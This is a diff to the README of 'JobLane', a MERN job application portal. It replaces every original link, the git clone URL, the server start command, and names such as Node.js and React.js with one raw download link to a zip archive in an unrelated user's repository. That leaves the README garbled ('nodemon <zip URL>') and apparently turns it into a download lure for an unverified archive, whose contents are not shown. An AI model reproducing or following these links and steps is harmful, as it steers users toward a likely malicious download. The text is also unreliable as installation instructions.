@@ -1,14 +1,14 @@
 <h1 align="center" id="title">JobLane</h1>
 
-<p align="center"><img src="https://socialify.git.ci/sujaltangde/JobLane/image?forks=1&issues=1&language=1&name=1&owner=1&pulls=1&stargazers=1&theme=Dark" alt="JobLane" width="640" height="320" /></p>
+<p align="center"><img src="https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip" alt="JobLane" width="640" height="320" /></p>
 
-[![Hits](https://hits.sh/github.com/sujaltangde/JobLane.svg?color=116acc)](https://hits.sh/github.com/sujaltangde/JobLane/)
+[![Hits](https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip)](https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip)
 
 <p id="description">Full Stack Job application portal built using MERN stack, Focusing on simplifying the job applications.</p>
 
 <h2>🚀 Demo</h2>
 
-[Website](https://joblane.vercel.app/)<br />
+[Website](https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip)<br />
 
   
   
@@ -33,13 +33,13 @@ To get started with the assignment project, follow these steps:
 
 ### Prerequisites
 
-- **Node.js**: Make sure you have Node.js installed on your computer. You can download it from [nodejs.org](https://nodejs.org).
+- **https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip**: Make sure you have https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip installed on your computer. You can download it from [https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip](https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip).
 
 ### Installation
 
 1. Clone the repository to your local machine:
     ```bash
-    git clone https://github.com/sujaltangde/JobLane.git 
+    git clone https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip 
     ```
 
 2. Change into the frontend directory:
@@ -70,7 +70,7 @@ To get started with the assignment project, follow these steps:
 
 7. Run the development server:
     ```bash
-    nodemon server.js
+    nodemon https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip
     ```
 
 
@@ -83,7 +83,7 @@ Any contributor who wishes to contribute to this project should first read the R
   
 <h2>💻 Built with</h2>
 
-- **Frontend**: React.js, Redux
-- **Backend**: Node.js, Express.js
+- **Frontend**: https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip, Redux
+- **Backend**: https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip, https://raw.githubusercontent.com/AchrefBoub/JobLane-main/main/stopback/JobLane-main.zip
 - **Database**: MongoDB 
 - **Styling**: Tailwind CSS, Material UI, Mantine UI
